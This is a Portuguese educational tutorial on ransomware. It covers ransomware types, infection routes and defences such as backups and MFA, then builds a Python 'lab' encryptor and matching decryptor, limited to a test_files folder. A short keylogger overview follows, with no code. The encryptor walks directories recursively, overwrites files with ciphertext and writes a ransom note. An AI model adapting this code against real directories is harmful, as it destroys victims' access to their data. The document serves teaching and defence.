# Simulando um Ransomware com Python

> ⚠️ **Aviso Legal (Disclaimer)**
>
> Este projeto foi desenvolvido exclusivamente para fins educacionais, em um ambiente controlado de laboratório e com o objetivo de estudar conceitos de cibersegurança, criptografia e funcionamento de malwares.
>
> O código não deve ser utilizado contra computadores, arquivos, redes ou sistemas sem autorização prévia. Execute os testes somente em ambientes próprios e isolados.

---

## Ransomware

**Ransomware** é um tipo de malware que impede o acesso aos dados da vítima, geralmente por meio da criptografia de arquivos, e exige um pagamento de resgate para que eles sejam recuperados.

Existem diferentes formas de ransomware e diferentes estratégias utilizadas pelos criminosos.

### Principais tipos de ransomware

- **Crypto Ransomware:** criptografa arquivos do dispositivo, como documentos, fotos e bancos de dados, tornando-os inacessíveis sem a chave de descriptografia.

- **Locker Ransomware:** bloqueia o acesso ao sistema operacional ou à interface do dispositivo, impedindo que o usuário utilize normalmente o computador.

- **Double Extortion:** além de criptografar os dados, os criminosos também podem copiar informações antes da criptografia e ameaçar divulgá-las publicamente caso o resgate não seja pago.

- **Triple Extortion:** adiciona outras formas de pressão à vítima, podendo envolver ameaças a clientes, parceiros ou ataques adicionais.

---

## Como ocorrem as infecções?

Existem diversas formas pelas quais um ransomware pode chegar a um computador ou rede.

### Phishing

Uma das técnicas mais comuns é o **phishing**.

Nesse tipo de ataque, a vítima recebe uma mensagem falsa tentando induzi-la a clicar em um link, abrir um anexo ou fornecer informações.

Exemplos de mensagens utilizadas em campanhas maliciosas:

- "Você ganhou um prêmio!"
- "Você recebeu uma transferência."
- "Seu CPF está irregular!"
- "Sua conta será bloqueada."

O objetivo é induzir a vítima a realizar uma ação que permita a execução do malware ou o roubo de credenciais.

### Softwares piratas

Programas modificados ou crackeados baixados de fontes não confiáveis podem conter códigos maliciosos.

### Credenciais comprometidas

Contas protegidas por senhas fracas, reutilizadas ou que foram expostas em vazamentos podem ser utilizadas por invasores para obter acesso não autorizado.

---

## Como se proteger?

Algumas medidas importantes para reduzir o risco de infecção incluem:

### Backups regulares

Mantenha cópias de segurança atualizadas dos arquivos importantes.

Sempre que possível, mantenha pelo menos uma cópia **offline ou isolada da rede**, reduzindo o risco de que ela também seja criptografada por um ransomware.

### Atualizações

Mantenha o sistema operacional, aplicativos e soluções de segurança atualizados.

As atualizações frequentemente corrigem vulnerabilidades que poderiam ser exploradas por atacantes.

### Autenticação Multifator (MFA)

Utilize **MFA (Multi-Factor Authentication)** em contas importantes, especialmente em ambientes corporativos e serviços que armazenam informações sensíveis.

### Cuidado com arquivos e links

Evite abrir arquivos ou clicar em links recebidos de fontes desconhecidas.

Também evite desabilitar mecanismos de segurança para executar programas de procedência duvidosa.

---

# Criando um Ransomware para laboratório

Neste projeto será desenvolvido um exemplo simplificado de **Crypto Ransomware**, utilizando Python e a biblioteca `cryptography`.

⚠️ **Importante:** o programa desenvolvido neste laboratório foi projetado para trabalhar exclusivamente dentro da pasta `test_files/`. Não utilize o código em diretórios que contenham arquivos reais ou importantes.

O objetivo é demonstrar, de maneira controlada, conceitos como:

- geração de chaves criptográficas;
- criptografia de arquivos;
- leitura e gravação de arquivos;
- busca recursiva em diretórios;
- descriptografia;
- utilização da biblioteca `Fernet`.

---

## Ambiente de laboratório

Primeiramente, vamos criar uma pasta para o projeto.

Você pode utilizar qualquer nome. Neste exemplo, utilizaremos:

```text
Ransomware/
```

Dentro dela, criaremos os seguintes arquivos e diretórios:

```text
Ransomware/
├── ransomware.py
├── decrypt.py
├── requirements.txt
├── chave.key
└── test_files/
    ├── dados_teste.txt
    └── senhas_teste.txt
```

> **Observação:** `chave.key` será criada automaticamente pelo programa durante a execução. Ela não precisa ser criada manualmente.

---

# Arquivos de teste

Para evitar o uso de dados reais, utilizaremos informações fictícias.

## dados_teste.txt

```text
Nome: Maria Silva
Idade: 27
CPF: 000.000.000-00
E-mail: exemplo@teste.com
Cidade: Belo Horizonte
Estado: MG
```

## senhas_teste.txt

```text
Sol2026!
Cafe#100
Casa@123
Luz*2026
Dia#Feliz1
Paz@2026
Chave!99
Azul#456
Nuvem@10
Tempo!24
```

Esses arquivos serão utilizados apenas para demonstrar o processo de criptografia e posterior descriptografia.

---

# Desenvolvendo o ransomware de laboratório

No arquivo `ransomware.py`, vamos utilizar a biblioteca `cryptography` e o módulo `os`.

```python
from cryptography.fernet import Fernet
import os
```

---

## 1. Gerando a chave de criptografia

Primeiramente, precisamos gerar uma chave.

Essa chave será utilizada tanto para criptografar quanto para descriptografar os arquivos.

```python
def gerar_chave():
    chave = Fernet.generate_key()

    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
```

A função `Fernet.generate_key()` gera uma chave segura que será armazenada no arquivo `chave.key`.

---

## 2. Carregando a chave

Depois de criar a chave, precisamos carregá-la para utilizá-la durante a criptografia.

```python
def carrega_chave():
    return open("chave.key", "rb").read()
```

O parâmetro `rb` significa que o arquivo será aberto em modo de **leitura binária**.

---

## 3. Criptografando um arquivo

Agora podemos criar a função responsável por criptografar um arquivo.

```python
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados = file.read()

    dados_encriptados = f.encrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)
```

Nesse processo:

1. O arquivo é aberto em modo binário.
2. Seus dados são carregados na memória.
3. A chave Fernet é utilizada para criptografar os dados.
4. Os dados criptografados substituem o conteúdo original do arquivo.

---

## 4. Encontrando os arquivos de teste

Agora precisamos localizar os arquivos que serão utilizados no laboratório.

```python
def encontrar_arquivos(diretorio):
    lista = []

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)

            if not nome.endswith(".key"):
                lista.append(caminho)

    return lista
```

O método `os.walk()` percorre o diretório informado e seus subdiretórios.

Neste projeto, passaremos somente:

```text
test_files/
```

Dessa forma, os arquivos reais do computador não fazem parte do experimento.

---

## 5. Criando uma mensagem de demonstração

Para simular o comportamento de um ransomware, podemos criar uma mensagem informando que os arquivos foram criptografados.

```python
def mensagem_resgate():
    with open("Leia_Isso.txt", "w") as f:
        f.write("Seus arquivos de teste foram criptografados!\n")
        f.write("Este arquivo faz parte de um laboratório educacional.\n")
        f.write("Execute decrypt.py para restaurar os arquivos.")
```

Neste laboratório, a mensagem é apenas uma simulação. Nenhum pagamento real é solicitado.

---

## 6. Executando o programa

Por fim, vamos criar a função `main()`:

```python
def main():
    gerar_chave()

    chave = carrega_chave()

    arquivos = encontrar_arquivos("test_files")

    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)

    mensagem_resgate()

    print("Simulação executada com sucesso!")


if __name__ == "__main__":
    main()
```

O fluxo de execução será:

```text
Gerar chave
     ↓
Carregar chave
     ↓
Encontrar arquivos em test_files/
     ↓
Criptografar arquivos
     ↓
Criar mensagem de demonstração
```

---

# requirements.txt

Antes de executar o programa, precisamos instalar a biblioteca utilizada pelo projeto.

Crie o arquivo:

```text
requirements.txt
```

E adicione:

```text
cryptography>=46.0,<47.0
```

Depois, abra o terminal na pasta do projeto e execute:

```bash
pip install -r requirements.txt
```

Esse comando instala a dependência necessária para o projeto.

---

# Executando o laboratório

Depois de instalar a dependência, execute:

```bash
python ransomware.py
```

O programa deverá:

1. Criar a chave `chave.key`.
2. Localizar os arquivos dentro de `test_files/`.
3. Criptografar os arquivos encontrados.
4. Criar o arquivo `Leia_Isso.txt`.

Depois da execução, os arquivos dentro de `test_files/` estarão criptografados e não poderão ser lidos normalmente. Caso queira, pode ver o projeto completo Clicando [AQUI](./Encrypt/)

> ⚠️ **Atenção:** não exclua o arquivo `chave.key`. Ele é necessário para realizar a descriptografia.

---

# Criando o Decrypter

Agora vamos criar o programa responsável por restaurar os arquivos.

Crie o arquivo:

```text
decrypt.py
```

---

## 1. Importando as bibliotecas

Utilizaremos a mesma biblioteca utilizada durante a criptografia:

```python
from cryptography.fernet import Fernet
import os
```

---

## 2. Carregando a chave

Precisamos carregar a mesma chave utilizada durante a criptografia:

```python
def carrega_chave():
    return open("chave.key", "rb").read()
```

É importante utilizar a **mesma chave**. Uma nova chave não será capaz de descriptografar os arquivos anteriormente criptografados.

---

## 3. Descriptografando um arquivo

Agora podemos criar a função responsável pela descriptografia:

```python
def descriptografar_arquivo(arquivo, chave):
    f = Fernet(chave)

    with open(arquivo, "rb") as file:
        dados = file.read()

    dados_descriptografados = f.decrypt(dados)

    with open(arquivo, "wb") as file:
        file.write(dados_descriptografados)
```

O processo é semelhante à criptografia, porém ocorre no sentido inverso:

```text
Arquivo criptografado
        ↓
      Fernet
        ↓
Arquivo original
```

---

## 4. Encontrando os arquivos

Agora precisamos localizar os arquivos que serão restaurados:

```python
def encontrar_arquivos(diretorio):
    lista = []

    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)

            if not nome.endswith(".key"):
                lista.append(caminho)

    return lista
```

Novamente, o programa trabalhará exclusivamente com:

```text
test_files/
```

---

## 5. Executando o Decrypter

Por fim:

```python
def main():
    chave = carrega_chave()

    arquivos = encontrar_arquivos("test_files")

    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)

    print("Arquivos de teste restaurados com sucesso!")


if __name__ == "__main__":
    main()
```

---

# Restaurando os arquivos

Com os arquivos criptografados, execute:

```bash
python decrypt.py
```

O programa utilizará a chave armazenada em:

```text
chave.key
```

e tentará restaurar os arquivos dentro de:

```text
test_files/
```

Se tudo estiver correto, os arquivos voltarão ao conteúdo original.

---

# Fluxo completo do laboratório

O projeto funciona da seguinte maneira:

```text
                ┌────────────────────┐
                │ ransomware.py      │
                └─────────┬──────────┘
                          │
                          ▼
                 Gera chave.key
                          │
                          ▼
                 Lê test_files/
                          │
                          ▼
                  Criptografa
                   os arquivos
                          │
                          ▼
                 Arquivos ficam
                   ilegíveis
                          │
                          ▼
                ┌────────────────────┐
                │    decrypt.py      │
                └─────────┬──────────┘
                          │
                          ▼
                  Lê chave.key
                          │
                          ▼
                 Descriptografa
                   os arquivos
                          │
                          ▼
                 Arquivos restaurados
```

---

# Conceitos estudados

Com este laboratório, é possível estudar alguns conceitos importantes de cibersegurança e programação:

- 🔐 Criptografia simétrica;
- 🔑 Geração e armazenamento de chaves;
- 📁 Manipulação de arquivos em Python;
- 🔎 Busca recursiva em diretórios;
- 🐍 Utilização da biblioteca `cryptography`;
- 🧪 Criação de ambientes controlados para análise de malware;
- 🛡️ Conceitos básicos de prevenção contra ransomware.

---

# Keylogger

Um Keylogger é um software ou um dispositivo que é capaz de registrar *as teclas pressionadas pelo usuário*. É um conceito muito importante em Cibersegurança já que pode aparecer tanto em softwares como em ferramentas.

---

### Como Funciona?

O funcionamento de um Keylogger é relativamente simples, um usuário pressiona uma tecla e ele guarda qual tecla foi pressionada, por exemplo, se o usuário digita:

```texto
    email@email.com
    SenhaDoEmail123
```

O keylogger pode registrar a sequencia de teclas correspondentes. O risco é que pode capturar informações como **senhas, mensagens, dados bancários e outras informações privadas**, é por isso que um keylogger instalado sem autorização é uma ferramenta típica de espionagem.

---

## 🧩 Tipos de keylogger

### __1. Keylogger de Software__

Ele é executado no sistema operacional e tenta observar eventos de teclado. Pode funcionar em diferentes níveis, como:

* aplicação;
* sistema operacional;
* drivers;
* mecanismos de entrada.

### __2. Keylogger de hardware__

É um dispositivo físico colocado entre o teclado e o computador ou integrado ao próprio hardware. Como funciona fora do sistema operacional, pode ser mais difícil de detectar por ferramentas tradicionais de segurança.

### __3. Keylogger baseado em navegador__

Pode tentar capturar dados digitados em páginas ou formulários. Nesse caso, nem sempre precisa registrar todas as teclas do sistema — pode estar interessado especificamente em determinados campos de uma aplicação.

---

# Conclusão

Este projeto demonstra, de forma controlada, um dos princípios utilizados por **Crypto Ransomwares**: a criptografia de arquivos utilizando uma chave que posteriormente é necessária para recuperar os dados.

Apesar de o código ser simples e não representar um ransomware real completo, ele ajuda a compreender por que ataques desse tipo podem ser tão prejudiciais e por que medidas como **backup, MFA, atualizações e conscientização dos usuários** são importantes na segurança da informação.

> **Nunca execute esse tipo de código em arquivos pessoais, computadores de terceiros ou ambientes de produção. Utilize exclusivamente arquivos de teste e ambientes autorizados.**

---

## Estrutura final do projeto

```text
Encrypt/
│
├── ransomware.py
├── decrypt.py
├── requirements.txt
├── chave.key
├── Leia_Isso.txt
│
└── test_files/
    ├── dados_teste.txt
    └── senhas_teste.txt
```